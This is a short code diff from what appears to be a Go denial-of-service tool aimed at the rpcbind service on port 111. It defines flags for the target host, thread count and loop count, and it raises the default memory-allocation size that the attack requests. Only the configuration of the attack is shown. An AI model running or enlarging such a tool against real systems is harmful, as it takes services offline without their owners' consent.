@@ -104,7 +104,7 @@ func main() {
 	fmt.Println(bomb)
 
 	ptrHost := flag.String("host", "REQUIRED", "This is the target host of the attack (IP Address)") // Create Host Flag
-	ptrNumBytes := flag.Int("numbytes", 3999999999, "This the number of bytes to try an allocate")   // create numBytes Flag
+	ptrNumBytes := flag.Int("numbytes", 5999999999, "This the number of bytes to try an allocate")   // create numBytes Flag
 	ptrPort := flag.Int("port", 111, "This is the port RPC Bind is running on")                      // create Port Flag
 	ptrLoop := flag.Int64("loop", 1, "The number of times to loop (max=9223372036854775807)")        // Create Loop Flag
 	ptrThreads := flag.Int("threads", 1, "The number of threads (Workers) to launch the attack")     // Create threads Flag
